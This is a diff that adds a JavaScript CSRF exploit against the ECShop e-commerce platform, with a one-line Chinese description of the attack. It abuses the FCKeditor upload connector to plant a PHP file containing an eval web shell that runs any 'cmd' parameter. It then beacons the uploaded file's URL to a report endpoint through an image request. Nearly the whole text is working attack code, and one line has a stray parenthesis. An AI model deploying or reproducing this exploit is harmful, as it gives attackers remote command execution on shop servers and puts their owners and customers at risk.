@@ -1,0 +1,22 @@
+ecshop注册可以上传txt，利用IE特性，CSRF之。
+-----------------------------------------------------------------csrf.js-------------------------------------------------------------------------------
+var url = 'http://' + window.location.host + '/includes/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media');
+if (postshell(url)) {
+report(url);
+}
+function postshell(url) {
+var postData = '-----------------------------7db2bf33d0514\r\n'
++ 'Content-Disposition: form-data; name="NewFile"; filename="media.php"\r\n'
++ 'Content-Type: application/x-php\r\n\r\n'
++ '<?php eval($_REQUEST["cmd"]);?>\r\n'
++ '-----------------------------7db2bf33d0514--\r\n'
+var xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+xmlhttp.open("POST", url, false);
+xmlhttp.setRequestHeader('Content-Type', 'multipart/form-data; boundary=---------------------------7db2bf33d0514');
+xmlhttp.send(postData);
+return true;
+}
+function report(url) {
+var img = new Image();
+img.src = "http://localhost/report.php?url=" + url;
+}
